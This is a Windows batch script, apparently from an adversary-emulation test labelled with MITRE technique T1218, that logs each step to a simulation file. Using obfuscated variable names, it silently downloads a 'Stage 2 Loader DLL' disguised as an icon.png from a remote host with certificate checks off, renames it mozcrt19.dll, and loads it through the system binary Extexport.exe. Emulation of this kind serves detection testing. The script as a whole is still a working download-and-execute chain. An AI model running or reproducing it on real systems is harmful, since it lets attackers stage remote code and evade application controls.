@echo off
setlocal enabledelayedexpansion

REM ── SET variable preamble ──────────────────────────────────────────────────
SET bvkrwz=BALAM-S2B
SET qlmxdt=7
SET fnjpcs=%APPDATA%\7\macula-simulations.log
SET hwotgr=%APPDATA%\10419\8519ec8f
SET ydcmxk=d5a6c69c.txt
SET rzpbwn=10419
SET ujktlv=https://10.0.0.49/stage/2/icon.png?10419-7
SET emqxhd=%APPDATA%\7

REM ── Cache timestamp once at script start ───────────────────────────────────
SET tsvar=!DATE!/!TIME!

REM ── Debug: script_start ────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: script_start>> "!fnjpcs!" 2>nul

REM ── Debug: heartbeat_start ─────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: heartbeat_start>> "!fnjpcs!" 2>nul

REM ── Heartbeat fetch — downloads Stage 2 Loader DLL to disk ────────────────
curl -k -s -o "!hwotgr!\!ydcmxk!" "!ujktlv!"

REM ── Debug: heartbeat_complete ──────────────────────────────────────────────
SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: heartbeat_complete>> "!fnjpcs!" 2>nul

REM ── Debug: chdir_start ────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: chdir_start>> "!fnjpcs!" 2>nul

REM ── Change working directory to output dir ─────────────────────────────────
cd /d "!hwotgr!" >nul 2>&1

REM ── Debug: chdir_result ───────────────────────────────────────────────────
SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: chdir_result=!ERRORLEVEL!>> "!fnjpcs!" 2>nul

REM ── Rename downloaded DLL to mozcrt19.dll (required by Extexport.exe) ──────
REM ── Debug: rename_start ───────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: rename_start>> "!fnjpcs!" 2>nul

rename "!hwotgr!\!ydcmxk!" mozcrt19.dll >nul 2>&1

SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: rename_result=!ERRORLEVEL!>> "!fnjpcs!" 2>nul

REM ── T1218 — System Binary Proxy Execution via Extexport.exe (LOLBIN) ───────
REM ── Debug: lolbin_start ───────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: lolbin_start>> "!fnjpcs!" 2>nul

REM ── Debug: dll_load ───────────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: dll_load>> "!fnjpcs!" 2>nul

REM ── Debug: command_execution ──────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: command_execution>> "!fnjpcs!" 2>nul

REM Extexport.exe loads mozcrt19.dll from the directory supplied as first arg
%SystemRoot%\System32\Extexport.exe "!hwotgr!" foo bar

SET _lolbin_err=!ERRORLEVEL!
SET tsvar=!DATE!/!TIME!

REM ── Debug: lolbin_result ──────────────────────────────────────────────────
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: lolbin_result=!_lolbin_err!>> "!fnjpcs!" 2>nul

REM ── Per-TTP log line emit for T1218 ───────────────────────────────────────
IF !_lolbin_err! EQU 0 (
    echo [!tsvar!][TTP][!bvkrwz!][!rzpbwn!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!fnjpcs!" 2>nul
) ELSE (
    echo [!tsvar!][TTP][!bvkrwz!][!rzpbwn!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed]>> "!fnjpcs!" 2>nul
)

REM ── Debug: script_end ─────────────────────────────────────────────────────
SET tsvar=!DATE!/!TIME!
echo [!tsvar!][DEBUG][!bvkrwz!][!rzpbwn!]: script_end>> "!fnjpcs!" 2>nul

endlocal